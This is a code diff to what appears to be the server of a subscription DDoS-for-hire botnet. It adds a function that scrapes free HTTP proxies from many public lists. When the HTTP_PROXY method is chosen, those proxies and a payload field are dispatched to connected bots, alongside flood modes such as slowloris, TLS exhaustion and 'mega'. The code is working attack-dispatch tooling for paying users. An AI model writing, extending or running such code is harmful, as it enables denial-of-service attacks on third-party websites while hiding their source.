@@ -8,6 +8,62 @@ from app.models.all_models import AttackTask, Bot, User, Plan, UserSubscription
 from app.schemas.all_schemas import AttackCreate
 from app.services.bot_service import BotService
 from app.websocket.bot_handler import manager
+import asyncio, aiohttp
+
+# ── Auto proxy fetcher ──
+_proxy_cache = {"list": "", "ts": 0}
+PROXY_SOURCES = [
+    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+    "https://raw.githubusercontent.com/hyperhttp/proxy-lists/main/http.txt",
+    "https://raw.githubusercontent.com/Eliweb3431/Proxy-List/main/http.txt",
+    "https://raw.githubusercontent.com/sunny0676/Proxy-List/main/http.txt",
+    "https://raw.githubusercontent.com/MuRongPIG/Proxy/main/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/saschapes/Fresh-Proxy-List/main/http.txt",
+    "https://raw.githubusercontent.com/BINGOWO/proxy_list/main/proxy.txt",
+    "https://www.proxy-list.download/api/v1/get?type=https",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://api.openproxylist.xyz/http.txt",
+]
+
+async def fetch_free_proxies(limit=500):
+    """Fetch free HTTP proxies from multiple sources. Cached 5 min."""
+    now = datetime.now(timezone.utc).timestamp()
+    if _proxy_cache["list"] and now - _proxy_cache["ts"] < 300:
+        lines = _proxy_cache["list"].strip().split("\n")
+        return "\n".join(lines[:limit]) if len(lines) > limit else _proxy_cache["list"]
+
+    proxies = set()
+    timeout = aiohttp.ClientTimeout(total=10)
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        for url in PROXY_SOURCES:
+            try:
+                async with session.get(url) as r:
+                    if r.status == 200:
+                        text = await r.text()
+                        for line in text.strip().split("\n"):
+                            line = line.strip()
+                            # Accept ip:port or protocol://ip:port
+                            if "://" in line:
+                                line = line.split("://", 1)[1]
+                            if ":" in line and line.count(".") >= 3:
+                                proxies.add(line)
+                            if len(proxies) >= limit * 2:
+                                break
+            except Exception:
+                continue
+            if len(proxies) >= limit * 2:
+                break
+
+    result = "\n".join(list(proxies)[:limit])
+    _proxy_cache["list"] = result
+    _proxy_cache["ts"] = now
+    print(f"[proxy] Fetched {len(proxies)} proxies, sending {min(len(proxies), limit)}")
+    return result
 
 class AttackService:
     @staticmethod
@@ -103,6 +159,15 @@ class AttackService:
             await s.refresh(task)
 
             method = data.method.upper()
+
+            # Auto-fetch free proxies for HTTP_PROXY if not provided
+            proxy_list = data.proxies or ""
+            if method == "HTTP_PROXY" and not proxy_list:
+                try:
+                    proxy_list = await fetch_free_proxies(limit=500)
+                except Exception as e:
+                    print(f"[proxy] Auto-fetch failed: {e}")
+
             delivered = 0
             for bot in available:
                 try:
@@ -119,6 +184,8 @@ class AttackService:
                         "slowloris": int(data.slowloris or method == "SLOWLORIS"),
                         "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
                         "mega_mode": int(data.mega_mode or method == "MEGA"),
+                        "payload": data.payload or "",
+                        "proxies": proxy_list,
                     })
                     delivered += 1
                 except Exception as e:
